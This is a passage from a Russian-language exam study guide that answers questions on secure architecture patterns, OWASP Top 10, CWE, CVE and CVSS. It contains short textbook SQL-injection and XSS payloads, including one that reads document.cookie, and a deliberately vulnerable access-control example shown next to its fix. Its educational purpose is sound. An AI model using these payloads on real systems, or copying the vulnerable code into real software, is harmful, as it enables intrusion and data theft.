│   MILS Separation Kernel            │
│  (Доверенная основа системы)        │
├─────────────────────────────────────┤
│   Partition 1  │  Partition 2       │
│   (Level 1)    │  (Level 2)         │
│                │                    │
│   Isolated     │  Isolated          │
└─────────────────────────────────────┘
```

**Применение:**

1. **Критически важные системы:**
   - Военные системы
   - Системы управления воздушным движением
   - Медицинское оборудование

2. **Системы с разными уровнями классификации:**
   - Системы, обрабатывающие данные разного уровня секретности
   - Системы, где необходимо разделение публичных и конфиденциальных данных

3. **КИИ (Критическая информационная инфраструктура):**
   - Системы энергетики
   - Системы управления транспортом

**Преимущества:**

1. **Безопасность:**
   - Высокая степень изоляции
   - Предотвращение утечек информации

2. **Надёжность:**
   - Сбой одного раздела не влияет на другие
   - Повышенная отказоустойчивость

3. **Сертификация:**
   - Облегчает сертификацию по Common Criteria
   - Соответствие требованиям безопасности

**Пример реализации:**
```python
# Концептуальный пример разделения
class MILSPartition:
    def __init__(self, security_level):
        self.security_level = security_level
        self.isolated_memory = IsolatedMemory()
        self.isolated_storage = IsolatedStorage()
    
    def send_to_partition(self, data, target_partition):
        # Проверка политики информации
        if target_partition.security_level < self.security_level:
            raise SecurityError("Cannot send to lower security level")
        
        # Отправка через доверенный коммуникационный канал
        trusted_kernel.send(self, target_partition, data)
```

---

### 113. Что такое паттерн «Claim Check»?

**Ответ:** Паттерн **"Claim Check"** (чек-квитанция) — это паттерн интеграции, при котором вместо передачи больших данных через промежуточную систему (например, очередь сообщений) передаётся только идентификатор (чек), по которому получатель может извлечь данные из хранилища.

**Проблема, которую решает:**
- Очереди сообщений ограничены по размеру сообщений
- Передача больших данных через очередь неэффективна
- Большие сообщения замедляют обработку очереди

**Как работает:**

1. **Отправитель:**
   - Сохраняет большие данные в хранилище
   - Получает уникальный идентификатор (claim check)
   - Отправляет в очередь только claim check и метаданные

2. **Получатель:**
   - Получает claim check из очереди
   - Извлекает данные из хранилища по claim check
   - Обрабатывает данные

**Пример реализации:**

```python
import uuid
import redis
from cryptography.fernet import Fernet

class ClaimCheckService:
    def __init__(self):
        self.storage = redis.Redis()
        self.cipher = Fernet(Fernet.generate_key())
    
    def store_data(self, data: bytes) -> str:
        """Сохраняет данные и возвращает claim check"""
        claim_id = str(uuid.uuid4())
        
        # Шифрование перед сохранением
        encrypted_data = self.cipher.encrypt(data)
        
        # Сохранение с TTL
        self.storage.setex(
            f"claim:{claim_id}",
            3600,  # 1 час
            encrypted_data
        )
        
        return claim_id
    
    def retrieve_data(self, claim_id: str) -> bytes:
        """Извлекает данные по claim check"""
        # Валидация claim_id
        if not self._validate_claim_id(claim_id):
            raise ValueError("Invalid claim ID")
        
        encrypted_data = self.storage.get(f"claim:{claim_id}")
        if not encrypted_data:
            raise ValueError("Claim check not found or expired")
        
        # Расшифровка
        data = self.cipher.decrypt(encrypted_data)
        
        # Удаление после использования (опционально)
        self.storage.delete(f"claim:{claim_id}")
        
        return data
    
    def _validate_claim_id(self, claim_id: str) -> bool:
        """Валидация формата claim ID"""
        import re
        return bool(re.match(r'^[a-f0-9-]{36}$', claim_id))

# Использование
service = ClaimCheckService()

# Отправитель: сохраняет большие данные
large_data = b"Very large data..." * 10000
claim_id = service.store_data(large_data)

# Передача только claim_id через очередь
message_queue.send({
    "claim_id": claim_id,
    "metadata": {"type": "report", "size": len(large_data)}
})

# Получатель: извлекает данные
message = message_queue.receive()
data = service.retrieve_data(message["claim_id"])
```

**Безопасные особенности:**

1. **Уникальный идентификатор** — UUID, сложно угадать
2. **Валидация** — проверка формата claim ID
3. **Шифрование** — данные шифруются перед сохранением
4. **TTL** — автоматическое удаление через время
5. **Одноразовое использование** — удаление после извлечения

**Преимущества:**

- Эффективность — очередь не перегружается большими данными
- Безопасность — данные хранятся в защищённом хранилище
- Масштабируемость — можно обрабатывать данные любого размера
- Гибкость — разные получатели могут извлекать данные

---

### 114. Что такое паттерн «Circuit Breaker»?

**Ответ:** Паттерн **"Circuit Breaker" (Автоматический выключатель)** — это паттерн проектирования, который предотвращает каскадные отказы, временно прерывая вызовы к неисправному сервису, позволяя ему восстановиться.

**Состояния Circuit Breaker:**

1. **Closed (Закрыт) — нормальная работа:**
   - Запросы проходят через circuit breaker
   - Отслеживание ошибок и времени отклика

2. **Open (Открыт) — сбой обнаружен:**
   - Запросы немедленно отклоняются без обращения к сервису
   - Быстрый ответ об ошибке

3. **Half-Open (Полуоткрыт) — тестирование:**
   - Разрешается ограниченное количество запросов
   - Если запросы успешны → переход в Closed
   - Если запросы неудачны → возврат в Open

**Реализация:**

```python
import time
from enum import Enum
from threading import Lock

class CircuitState(Enum):
    CLOSED = "closed"
    OPEN = "open"
    HALF_OPEN = "half_open"

class CircuitBreaker:
    def __init__(self, failure_threshold=5, timeout=60, success_threshold=2):
        self.failure_threshold = failure_threshold  # Порог ошибок
        self.timeout = timeout  # Время ожидания в Open
        self.success_threshold = success_threshold  # Успешных запросов для перехода в Closed
        
        self.failure_count = 0
        self.success_count = 0
        self.last_failure_time = None
        self.state = CircuitState.CLOSED
        self.lock = Lock()
    
    def call(self, func, *args, **kwargs):
        with self.lock:
            # Проверка состояния
            if self.state == CircuitState.OPEN:
                if time.time() - self.last_failure_time > self.timeout:
                    # Переход в Half-Open
                    self.state = CircuitState.HALF_OPEN
                    self.success_count = 0
                else:
                    # Circuit открыт, отклоняем запрос
                    raise CircuitBreakerOpenError("Circuit breaker is OPEN")
            
            # Выполнение функции
            try:
                result = func(*args, **kwargs)
                
                # Успешный запрос
                if self.state == CircuitState.HALF_OPEN:
                    self.success_count += 1
                    if self.success_count >= self.success_threshold:
                        self.state = CircuitState.CLOSED
                        self.failure_count = 0
                
                if self.state == CircuitState.CLOSED:
                    self.failure_count = 0
                
                return result
            
            except Exception as e:
                # Неудачный запрос
                self.failure_count += 1
                self.last_failure_time = time.time()
                
                if self.failure_count >= self.failure_threshold:
                    self.state = CircuitState.OPEN
                
                raise

# Использование
breaker = CircuitBreaker(failure_threshold=5, timeout=60)

try:
    result = breaker.call(external_service.request, data)
except CircuitBreakerOpenError:
    # Быстрый ответ при открытом circuit
    return {"error": "Service temporarily unavailable"}
except Exception as e:
    # Обработка других ошибок
    return {"error": str(e)}
```

**Преимущества:**

1. **Предотвращение каскадных отказов:**
   - Быстрый отказ вместо длительного ожидания
   - Защита от перегрузки неисправного сервиса

2. **Время на восстановление:**
   - Сервису даётся время на восстановление
   - Автоматическое тестирование восстановления

3. **Улучшение производительности:**
   - Быстрые ответы при открытом circuit
   - Нет ожидания таймаутов

**Настройки:**

- **failure_threshold** — количество ошибок для открытия circuit
- **timeout** — время в открытом состоянии перед переходом в half-open
- **success_threshold** — количество успешных запросов для закрытия circuit

---

### 115. Что такое паттерн «Retry with Backoff»?

**Ответ:** Паттерн **"Retry with Backoff" (Повтор с экспоненциальной задержкой)** — это паттерн обработки ошибок, при котором неудачные запросы повторяются с увеличивающейся задержкой между попытками.

**Типы backoff:**

1. **Exponential Backoff (Экспоненциальная задержка):**
   - Задержка увеличивается экспоненциально: 1s, 2s, 4s, 8s, 16s...

2. **Linear Backoff (Линейная задержка):**
   - Задержка увеличивается линейно: 1s, 2s, 3s, 4s, 5s...

3. **Jitter (Случайная вариация):**
   - Добавление случайности для предотвращения "thundering herd"

**Реализация:**

```python
import time
import random
from functools import wraps

def retry_with_backoff(max_retries=3, initial_delay=1, max_delay=60, exponential_base=2, jitter=True):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            delay = initial_delay
            
            for attempt in range(max_retries):
                try:
                    return func(*args, **kwargs)
                except RetryableError as e:
                    if attempt == max_retries - 1:
                        raise
                    
                    # Вычисление задержки
                    if jitter:
                        # Добавление случайности
                        delay_with_jitter = delay * (0.5 + random.random())
                    else:
                        delay_with_jitter = delay
                    
                    # Ограничение максимальной задержки
                    delay_with_jitter = min(delay_with_jitter, max_delay)
                    
                    time.sleep(delay_with_jitter)
                    
                    # Увеличение задержки для следующей попытки
                    delay = min(delay * exponential_base, max_delay)
            
            raise MaxRetriesExceeded(f"Failed after {max_retries} attempts")
        
        return wrapper
    return decorator

# Использование
@retry_with_backoff(max_retries=5, initial_delay=1, max_delay=30)
def api_call():
    response = requests.get("https://api.example.com/data")
    if response.status_code == 429:  # Rate limit
        raise RetryableError("Rate limited")
    response.raise_for_status()
    return response.json()
```

**Безопасные практики:**

1. **Только для временных ошибок:**
   - Retry только для transient errors (timeout, 429, 503)
   - Не retry для permanent errors (400, 401, 404)

2. **Ограничение количества попыток:**
   - Максимальное количество retry
   - Общий timeout для всех попыток

3. **Jitter:**
   - Предотвращение одновременных retry от множества клиентов
   - Снижение нагрузки на сервис

**Пример с различными стратегиями:**

```python
class RetryStrategy:
    @staticmethod
    def exponential(delay, attempt, base=2):
        return min(delay * (base ** attempt), 60)
    
    @staticmethod
    def linear(delay, attempt):
        return delay * (attempt + 1)
    
    @staticmethod
    def constant(delay, attempt):
        return delay

def retry(func, strategy=RetryStrategy.exponential, max_retries=3):
    for attempt in range(max_retries):
        try:
            return func()
        except RetryableError:
            if attempt < max_retries - 1:
                delay = strategy(1, attempt)
                time.sleep(delay)
            else:
                raise
```

---

### 116. Что такое паттерн «Throttling» и как он защищает от Resource Exhaustion?

**Ответ:** Паттерн **"Throttling" (Дросселирование)** — это механизм ограничения количества запросов или операций от клиента в единицу времени для предотвращения перегрузки системы и атак на исчерпание ресурсов.

**Как защищает от Resource Exhaustion:**

1. **Ограничение количества запросов:**
   - Предотвращает отправку большого количества запросов одним клиентом
   - Защищает от DDoS и брутфорс-атак

2. **Защита ресурсов:**
   - Предотвращает исчерпание CPU, памяти, соединений с БД
   - Обеспечивает доступность системы для всех пользователей

3. **Справедливое распределение:**
   - Ограничивает использование ресурсов одним клиентом
   - Гарантирует ресурсы для других пользователей

**Реализация:**

```python
import time
from collections import defaultdict
from threading import Lock

class Throttler:
    def __init__(self, requests_per_second=10, requests_per_minute=100):
        self.rps_limit = requests_per_second
        self.rpm_limit = requests_per_minute
        self.requests = defaultdict(list)
        self.lock = Lock()
    
    def is_allowed(self, identifier: str) -> bool:
        """Проверяет, разрешён ли запрос"""
        now = time.time()
        
        with self.lock:
            # Получение истории запросов
            request_history = self.requests[identifier]
            
            # Удаление старых запросов (старше минуты)
            request_history[:] = [t for t in request_history if now - t < 60]
            
            # Проверка лимита в минуту
            if len(request_history) >= self.rpm_limit:
                return False
            
            # Проверка лимита в секунду
            recent_requests = [t for t in request_history if now - t < 1]
            if len(recent_requests) >= self.rps_limit:
                return False
            
            # Добавление текущего запроса
            request_history.append(now)
            
            return True

# Использование
throttler = Throttler(requests_per_second=10, requests_per_minute=100)

@app.route('/api/data')
def get_data():
    client_id = request.remote_addr
    
    if not throttler.is_allowed(client_id):
        return {"error": "Rate limit exceeded"}, 429
    
    return {"data": "..."}
```

**Типы throttling:**

1. **Rate Limiting** — ограничение количества запросов в единицу времени
2. **Connection Throttling** — ограничение количества одновременных соединений
3. **Bandwidth Throttling** — ограничение пропускной способности

---

### 117. Что такое паттерн «Saga» и как он обеспечивает согласованность в распределённых системах?

**Ответ:** Паттерн **"Saga"** — это паттерн управления транзакциями в распределённых системах, где длинная транзакция разбивается на последовательность локальных транзакций, каждая из которых может быть откачена через компенсирующую транзакцию.

**Проблема:**
В микросервисной архитектуре нельзя использовать двухфазный коммит (2PC) для распределённых транзакций, так как это блокирует ресурсы и снижает производительность.

**Типы Saga:**

1. **Choreography (Хореография):**
   - Каждый сервис знает, что делать дальше
   - События публикуются в брокер сообщений
   - Слабая связанность, но сложнее отслеживание

2. **Orchestration (Оркестрация):**
   - Центральный оркестратор координирует выполнение
   - Оркестратор знает все шаги
   - Проще отслеживание, но централизованная логика

**Пример Orchestration Saga:**

```python
class OrderSaga:
    def __init__(self):
        self.steps = [
            self.reserve_inventory,
            self.process_payment,
            self.ship_order,
            self.send_notification
        ]
        self.compensations = [
            self.cancel_reservation,
            self.refund_payment,
            self.cancel_shipment,
            None  # Уведомление не требует компенсации
        ]
    
    def execute(self, order_data):
        executed_steps = []
        
        try:
            for step in self.steps:
                step(order_data)
                executed_steps.append(step)
            
            return {"status": "completed"}
        
        except Exception as e:
            # Компенсация выполненных шагов в обратном порядке
            for step in reversed(executed_steps):
                idx = self.steps.index(step)
                if self.compensations[idx]:
                    self.compensations[idx](order_data)
            
            return {"status": "failed", "error": str(e)}
    
    def reserve_inventory(self, order_data):
        # Резервирование товара
        inventory_service.reserve(order_data['items'])
    
    def cancel_reservation(self, order_data):
        # Отмена резервирования
        inventory_service.cancel_reservation(order_data['items'])
    
    def process_payment(self, order_data):
        # Обработка платежа
        payment_service.charge(order_data['payment'])
    
    def refund_payment(self, order_data):
        # Возврат средств
        payment_service.refund(order_data['payment'])
```

**Обеспечение согласованности:**

1. **Атомарность на уровне шагов:**
   - Каждый шаг — локальная транзакция
   - Либо выполняется полностью, либо откатывается

2. **Компенсирующие транзакции:**
   - Для каждого шага есть компенсация
   - Откат в обратном порядке выполнения

3. **Идемпотентность:**
   - Компенсирующие транзакции должны быть идемпотентными
   - Повторное выполнение не должно вызывать проблем

**Преимущества:**

- Работает в распределённых системах
- Не блокирует ресурсы надолго
- Подходит для длительных процессов

**Недостатки:**

- Сложность реализации компенсаций
- Возможна временная несогласованность
- Сложность отладки

---

### 118. Что такое паттерн «Input Validation (Allowlist)»?

**Ответ:** Паттерн **"Input Validation (Allowlist)"** — это практика безопасности, при которой разрешаются только заранее определённые, известные безопасные значения входных данных, а всё остальное отклоняется.

**Принципы:**

1. **Whitelist (Allowlist):** Определение списка разрешённых значений
2. **Deny by default:** По умолчанию всё запрещено
3. **Строгая валидация:** Проверка формата и содержимого

**Примеры:**

```python
# 1. Валидация по фиксированному списку
ALLOWED_ROLES = ['admin', 'user', 'guest']

def validate_role(role: str) -> str:
    if role not in ALLOWED_ROLES:
        raise ValueError(f"Role {role} not allowed")
    return role

# 2. Валидация по паттерну (allowlist символов)
import re

def validate_username(username: str) -> str:
    # Только буквы, цифры, подчёркивания, длина 3-20
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username format")
    return username

# 3. Валидация файлов
ALLOWED_EXTENSIONS = {'.jpg', '.png', '.pdf'}

def validate_file(filename: str) -> str:
    ext = os.path.splitext(filename)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError("File type not allowed")
    return filename

# 4. Валидация HTTP методов
ALLOWED_METHODS = {'GET', 'POST', 'PUT', 'DELETE'}

def validate_method(method: str) -> str:
    method = method.upper()
    if method not in ALLOWED_METHODS:
        raise ValueError("Method not allowed")
    return method
```

**Преимущества:**

- Высокий уровень безопасности
- Простота реализации
- Предсказуемость поведения

**Рекомендации:**

- Всегда используйте allowlist вместо blacklist
- Валидируйте на стороне сервера
- Нормализуйте данные перед валидацией
- Используйте строгие регулярные выражения

---

### 119. Что такое «Secure Logger» и зачем он нужен?

**Ответ:** **Secure Logger** — это система логирования, которая защищает чувствительные данные от утечек при записи в логи, применяя автоматическое маскирование, фильтрацию и шифрование.

**Проблемы обычного логирования:**

1. **Утечка чувствительных данных:**
   - Пароли, токены, номера карт в логах
   - Персональные данные в логах
   - Ключи шифрования в логах

2. **Несанкционированный доступ:**
   - Логи могут быть доступны неавторизованным пользователям
   - Логи хранятся в незашифрованном виде

**Функции Secure Logger:**

1. **Автоматическое маскирование:**
```python
import re
import logging

class SecureLogger:
    SENSITIVE_PATTERNS = [
        (r'password["\']?\s*[:=]\s*["\']?([^"\'\s]+)', r'password="***"'),
        (r'credit_card["\']?\s*[:=]\s*["\']?(\d+)', r'credit_card="****-****-****-****"'),
        (r'api_key["\']?\s*[:=]\s*["\']?([^"\'\s]+)', r'api_key="***"'),
        (r'ssn["\']?\s*[:=]\s*["\']?(\d+)', r'ssn="***-**-****"'),
    ]
    
    def mask_sensitive_data(self, message: str) -> str:
        for pattern, replacement in self.SENSITIVE_PATTERNS:
            message = re.sub(pattern, replacement, message, flags=re.IGNORECASE)
        return message
    
    def info(self, message):
        masked = self.mask_sensitive_data(str(message))
        logging.info(masked)
```

2. **Шифрование логов:**
```python
from cryptography.fernet import Fernet

class EncryptedLogger:
    def __init__(self, key: bytes):
        self.cipher = Fernet(key)
    
    def log(self, level, message):
        # Шифрование перед записью
        encrypted = self.cipher.encrypt(message.encode())
        logging.log(level, encrypted.hex())
```

3. **Фильтрация полей:**
```python
class FieldFilterLogger:
    SENSITIVE_FIELDS = ['password', 'token', 'api_key', 'credit_card']
    
    def filter_dict(self, data: dict) -> dict:
        filtered = {}
        for key, value in data.items():
            if key.lower() in self.SENSITIVE_FIELDS:
                filtered[key] = "***MASKED***"
            elif isinstance(value, dict):
                filtered[key] = self.filter_dict(value)
            else:
                filtered[key] = value
        return filtered
```

**Зачем нужен:**

- Защита от утечек конфиденциальных данных
- Соответствие требованиям GDPR, ФЗ-152
- Предотвращение компрометации через логи
- Аудит безопасности

---

### 120. Как правильно обрабатывать загрузку файлов на сервере?

**Ответ:** Правильная обработка загрузки файлов включает следующие меры безопасности:

**1. Валидация типа файла:**
```python
import magic
ALLOWED_MIME_TYPES = {'image/jpeg', 'image/png', 'application/pdf'}

def validate_file(file):
    file_content = file.read()
    file.seek(0)
    
    # Проверка MIME-типа по содержимому (не по расширению!)
    mime_type = magic.from_buffer(file_content, mime=True)
    if mime_type not in ALLOWED_MIME_TYPES:
        raise ValueError("Invalid file type")
```

**2. Валидация размера:**
```python
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB

if file.size > MAX_FILE_SIZE:
    raise ValueError("File too large")
```

**3. Безопасное имя файла:**
```python
import uuid
from werkzeug.utils import secure_filename

def get_safe_filename(original_filename):
    # Использование UUID вместо оригинального имени
    ext = os.path.splitext(original_filename)[1]
    return str(uuid.uuid4()) + ext
```

**4. Изоляция загруженных файлов:**
```python
from pathlib import Path

UPLOAD_DIR = Path("/var/uploads").resolve()

def save_file(file, filename):
    filepath = UPLOAD_DIR / filename
    
    # Проверка, что путь внутри UPLOAD_DIR
    try:
        filepath.resolve().relative_to(UPLOAD_DIR)
    except ValueError:
        raise ValueError("Invalid path")
    
    with open(filepath, 'wb') as f:
        f.write(file.read())
    
    # Безопасные права доступа
    os.chmod(filepath, 0o644)
```

**5. Сканирование на вирусы:**
```python
def scan_file(filepath):
    result = subprocess.run(['clamscan', str(filepath)], capture_output=True)
    if result.returncode != 0:
        raise ValueError("File contains malware")
```

**6. Контроль доступа:**
```python
@app.route('/download/<file_id>')
def download_file(file_id):
    # Валидация file_id
    if not re.match(r'^[a-f0-9-]{36}$', file_id):
        abort(400)
    
    # Проверка прав доступа
    if not user_has_access(current_user, file_id):
        abort(403)
    
    return send_file(filepath)
```

---

### 121. Что такое «Quarantine» артефактов и зачем он используется?

**Ответ:** **Quarantine (Карантин) артефактов** — это механизм блокировки артефактов сборки (Docker-образов, исполняемых файлов, пакетов), которые содержат обнаруженные уязвимости или не прошли проверки безопасности, с целью предотвращения их развёртывания в production.

**Зачем используется:**

1. **Предотвращение развёртывания уязвимостей**
2. **Контроль качества** — соответствие политикам безопасности
3. **Compliance** — соответствие стандартам
4. **Автоматизация** — автоматическая блокировка без ручного вмешательства

**Реализация:**

```python
class ArtifactQuarantine:
    def __init__(self):
        self.quarantine_storage = QuarantineStorage()
        self.vulnerability_scanner = VulnerabilityScanner()
    
    def check_and_quarantine(self, artifact):
        # Проверка на уязвимости
        vulnerabilities = self.vulnerability_scanner.scan(artifact)
        
        critical_vulns = [v for v in vulnerabilities if v.severity == 'critical']
        
        if critical_vulns:
            # Перемещение в карантин
            self.quarantine_storage.quarantine(artifact, critical_vulns)
            raise QuarantinedError("Artifact quarantined due to critical vulnerabilities")
        
        return artifact
```

---

### 122. Какие паттерны обеспечивают защиту в глубину (Defense-in-Depth)?

**Ответ:** Паттерны, обеспечивающие **защиту в глубину (Defense-in-Depth):**

1. **Gateway (Привратник)** — первая линия защиты
2. **BFF (Backend for Frontend)** — валидация и фильтрация
3. **Authentication/Authorization** — проверка прав доступа
4. **Input Validation** — валидация входных данных
5. **Output Encoding** — кодирование выходных данных
6. **Encryption** — шифрование данных в покое и при передаче
7. **Rate Limiting** — ограничение количества запросов
8. **WAF (Web Application Firewall)** — фильтрация на уровне сети
9. **Logging and Monitoring** — обнаружение аномалий
10. **Network Segmentation** — сегментация сети

**Многоуровневая защита:**

```
Интернет
  ↓ [WAF / DDoS Protection]
  ↓ [API Gateway - Rate Limiting]
  ↓ [Authentication]
  ↓ [BFF - Validation]
  ↓ [Authorization]
  ↓ [Application - Input Validation]
  ↓ [Database - Encryption]
```

---

### 123. Какие паттерны используются для изоляции компонентов согласно ГОСТ Р 71207-2024?

**Ответ:** Согласно ГОСТ Р 71207-2024, для изоляции компонентов используются:

1. **Разделение на изолированные модули**
2. **Использование границ изоляции (Boundaries)**
3. **Минимизация интерфейсов между компонентами**
4. **Контроль потоков данных между компонентами**
5. **Использование контейнеризации**
6. **Применение принципа наименьших привилегий**

---

### 124. Какие паттерны применяются для защиты данных в REST API?

**Ответ:** Паттерны для защиты данных в REST API:

1. **HTTPS/TLS** — шифрование трафика
2. **Authentication (OAuth 2.0, JWT)** — аутентификация
3. **Authorization (RBAC, ABAC)** — авторизация
4. **Input Validation** — валидация входных данных
5. **Output Filtering** — фильтрация чувствительных данных
6. **Rate Limiting** — ограничение количества запросов
7. **CORS** — контроль доступа к API
8. **API Versioning** — версионирование API
9. **Error Handling** — безопасная обработка ошибок

---

### 125. Какие архитектурные решения рекомендуются при проектировании КИИ?

**Ответ:** При проектировании КИИ (критической информационной инфраструктуры) рекомендуются:

1. **MILS-архитектура** — множественные независимые уровни безопасности
2. **Изоляция компонентов** — строгое разделение по уровням
3. **Защита в глубину** — многоуровневая защита
4. **Избыточность** — резервирование критичных компонентов
5. **Сегментация сети** — разделение на сегменты
6. **Мониторинг и логирование** — непрерывный мониторинг
7. **Аудит и соответствие** — соответствие требованиям ФСТЭК
8. **Управление инцидентами** — планы реагирования
9. **Шифрование данных** — защита данных в покое и при передаче
10. **Контроль доступа** — строгий контроль прав доступа

---

## Источники:
- Паттерны проектирования в области безопасности
- ГОСТ Р 56939-2024, ГОСТ Р 71207-2024
- OWASP Security Patterns
- Microsoft Architecture Patterns
- Best practices в области безопасного проектирования


# Ответы на вопросы к зачёту
## Раздел 6: Угрозы, уязвимости и классификации

### 126. К какой категории OWASP Top 10 (2021) относится SQL-инъекция?

**Ответ:** SQL-инъекция относится к категории **A03:2021 – Injection (Инъекции)** в OWASP Top 10 (2021).

**Описание категории:**
Категория Injection включает все виды инъекций, когда злоумышленник может вставить вредоносные данные, которые интерпретируются как команды или запросы системой:
- SQL Injection (SQLi)
- NoSQL Injection
- Command Injection
- LDAP Injection
- XPath Injection
- OS Command Injection

**Особенности SQL-инъекции:**
- Наиболее распространённый тип инъекций
- Позволяет выполнять произвольные SQL-запросы
- Может привести к чтению, изменению, удалению данных
- Может привести к компрометации всей базы данных

**Примеры:**
```sql
-- Классическая SQL-инъекция
SELECT * FROM users WHERE id = '1' OR '1'='1' --'

-- Union-based injection
SELECT * FROM users WHERE id = '1' UNION SELECT password FROM admin_users --'

-- Time-based blind injection
SELECT * FROM users WHERE id = '1'; WAITFOR DELAY '00:00:05' --'
```

---

### 127. К какой категории OWASP Top 10 (2021) относится XSS?

**Ответ:** XSS (Cross-Site Scripting) относится к категории **A03:2021 – Injection (Инъекции)** в OWASP Top 10 (2021).

**Примечание:** В более ранних версиях OWASP Top 10 XSS имел отдельную категорию, но в версии 2021 он объединён с другими типами инъекций в общую категорию Injection.

**Типы XSS:**
1. **Reflected XSS (Отражённый XSS):**
   - Сценарий отражается от сервера в ответе
   - Данные из запроса попадают в ответ без фильтрации

2. **Stored XSS (Постоянный XSS):**
   - Сценарий сохраняется на сервере (в БД)
   - Выполняется при каждом просмотре страницы

3. **DOM-based XSS:**
   - Сценарий выполняется на клиенте через манипуляции с DOM
   - Не требует отправки данных на сервер

**Примеры:**
```html
<!-- Reflected XSS -->
<script>alert('XSS')</script>

<!-- Stored XSS в комментарии -->
<img src="x" onerror="alert(document.cookie)">

<!-- DOM-based XSS -->
<script>document.write(location.hash)</script>
```

---

### 128. К какой категории OWASP Top 10 (2021) относится Broken Access Control?

**Ответ:** Broken Access Control относится к категории **A01:2021 – Broken Access Control (Нарушение контроля доступа)** — это первая и наиболее критичная категория в OWASP Top 10 (2021).

**Описание:**
Нарушение контроля доступа происходит, когда приложение не должным образом ограничивает доступ пользователей к ресурсам и функциям, к которым они не должны иметь доступа.

**Типичные проявления:**

1. **Horizontal Privilege Escalation (Горизонтальное повышение привилегий):**
   - Доступ к данным других пользователей того же уровня
   - Пример: `/api/users/123` вместо `/api/users/456`

2. **Vertical Privilege Escalation (Вертикальное повышение привилегий):**
   - Обычный пользователь получает права администратора
   - Пример: доступ к `/admin/delete-user` без прав администратора

3. **IDOR (Insecure Direct Object Reference):**
   - Прямая ссылка на объект без проверки прав
   - Пример: `/api/documents/123` без проверки, что документ принадлежит пользователю

4. **Missing Authorization (Отсутствие авторизации):**
   - Функции доступны без проверки прав
   - Пример: API-эндпоинт без проверки токена

**Примеры уязвимостей:**
```python
# УЯЗВИМО: Нет проверки прав
@app.route('/api/users/<user_id>')
def get_user(user_id):
    return User.query.get(user_id)

# БЕЗОПАСНО: Проверка прав
@app.route('/api/users/<user_id>')
@require_auth
def get_user(user_id):
    if current_user.id != int(user_id) and not current_user.is_admin:
        abort(403)
    return User.query.get(user_id)
```

**Статистика:**
- Занимает первое место в OWASP Top 10 (2021)
- Встречается в 94% протестированных приложений
- Средний взвешенный показатель влияния: 7.0/10

---

### 129. Что такое CWE?

**Ответ:** **CWE (Common Weakness Enumeration)** — это общий перечисленный список типов уязвимостей и ошибок программного обеспечения, разработанный сообществом MITRE Corporation.

**Определение:**
CWE — это категоризированный список типов слабостей в программном обеспечении, который обеспечивает:
- Общий язык для описания уязвимостей
- Базовую основу для выявления и исправления уязвимостей
- Меры для предотвращения уязвимостей

**Основные характеристики:**

1. **Структурированный список:**
   - Более 900 типов слабостей (CWE IDs)
   - Иерархическая структура
   - Связи между различными типами

2. **Описание слабостей:**
   - Определение слабости
   - Примеры уязвимого кода
   - Возможные последствия
   - Методы обнаружения
   - Рекомендации по исправлению

3. **Категоризация:**
   - По типу: Injection, Buffer Overflow, XSS и т.д.
   - По фазе разработки: Design, Implementation
   - По технологиям: Web, Desktop, Mobile

**Примеры CWE:**
- **CWE-79** — Cross-site Scripting (XSS)
- **CWE-89** — SQL Injection
- **CWE-78** — OS Command Injection
- **CWE-22** — Path Traversal
- **CWE-120** — Buffer Copy without Checking Size of Input

**Использование:**
- Инструменты статического анализа ссылаются на CWE
- Отчёты о безопасности содержат CWE IDs
- База знаний для разработчиков
- Стандартизация описания уязвимостей

**CWE Top 25:**
Ежегодно публикуется список 25 наиболее опасных слабостей программного обеспечения на основе их частоты и серьёзности.

---

### 130. Что такое CVE?

**Ответ:** **CVE (Common Vulnerabilities and Exposures)** — это каталог известных уязвимостей в безопасности программного обеспечения и аппаратного обеспечения, каждая из которых имеет уникальный идентификатор.

**Определение:**
CVE — это база данных, содержащая информацию о конкретных уязвимостях безопасности, обнаруженных в программных и аппаратных продуктах.

**Основные характеристики:**

1. **Уникальный идентификатор:**
   - Формат: `CVE-YYYY-NNNNN`
   - Год обнаружения + порядковый номер
   - Пример: `CVE-2021-44228` (Log4j vulnerability)

2. **Стандартизированное описание:**
   - Краткое описание уязвимости
   - Ссылки на дополнительные ресурсы
   - Информация о затронутых версиях

3. **Публичная доступность:**
   - Бесплатный доступ к базе данных
   - Поиск по продуктам и версиям
   - Интеграция с системами управления уязвимостями

**Пример CVE:**
```
CVE-2021-44228
Title: Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints
Description: Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.
CVSS Score: 10.0 (Critical)
```

**Источники CVE:**
- MITRE Corporation (главный куратор)
- CNAs (CVE Numbering Authorities) — организации, уполномоченные присваивать CVE
- Производители ПО
- Исследователи безопасности

**Использование:**
- Отслеживание известных уязвимостей в зависимостях
- Сканирование уязвимостей
- Управление патчами
- Соответствие требованиям безопасности

**Связь CVE и CWE:**
- CVE описывает конкретную уязвимость (например, CVE-2021-44228)
- CWE описывает тип слабости (например, CWE-502 — Deserialization of Untrusted Data)
- Один CVE может быть связан с одним или несколькими CWE

---

### 131. Что такое CVSS и для чего он применяется?

**Ответ:** **CVSS (Common Vulnerability Scoring System)** — это открытый стандарт для оценки и характеристики серьёзности уязвимостей безопасности в программном обеспечении.

**Определение:**
CVSS предоставляет числовую оценку (score) от 0.0 до 10.0, которая отражает серьёзность уязвимости, помогая организациям приоритизировать устранение уязвимостей.

**Версии CVSS:**
- **CVSS v2.0** — устаревшая версия
- **CVSS v3.0** — предыдущая версия
- **CVSS v3.1** — текущая версия (по состоянию на 2021)
- **CVSS v4.0** — разрабатываемая версия

**Метрики CVSS v3.1:**

**Base Score Metrics (Базовые метрики):**

1. **Attack Vector (AV):**
   - Network (N) — через сеть
   - Adjacent (A) — локальная сеть
   - Local (L) — локальный доступ
   - Physical (P) — физический доступ

2. **Attack Complexity (AC):**
   - Low (L) — низкая сложность
   - High (H) — высокая сложность

3. **Privileges Required (PR):**
   - None (N) — не требуются
   - Low (L) — низкие привилегии
   - High (H) — высокие привилегии

4. **User Interaction (UI):**
   - None (N) — не требуется
   - Required (R) — требуется

5. **Scope (S):**
   - Unchanged (U) — не изменяется
   - Changed (C) — изменяется

6. **Confidentiality (C):**
   - None (N) — нет утечки
